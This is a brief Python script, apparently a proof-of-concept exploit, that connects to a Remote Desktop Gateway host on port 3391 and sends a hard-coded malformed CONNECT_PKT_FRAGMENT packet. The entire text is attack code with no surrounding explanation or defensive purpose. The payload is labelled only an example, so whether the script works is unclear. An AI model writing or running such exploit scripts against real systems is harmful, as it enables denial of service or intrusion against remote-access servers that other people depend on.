import socket

# Target details
target_host = "target-rd-gateway.com"
target_port = 3391  # Default RD Gateway port

# Malformed CONNECT_PKT_FRAGMENT payload (example)
malformed_payload = b"\x03\x00\x00\x13\x0e\xd0\x00\x00\x124\x00\x02\x00\x1f\x00\x00"

# Create a socket connection
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    print(f"[+] Connecting to {target_host}:{target_port}")
    sock.connect((target_host, target_port))
    
    print("[+] Sending malformed CONNECT_PKT_FRAGMENT...")
    sock.send(malformed_payload)
    
    response = sock.recv(1024)
    print(f"[-] Response: {response.hex()}")

except Exception as e:
    print(f"[!] Exploit attempt failed: {e}")

finally:
    sock.close()
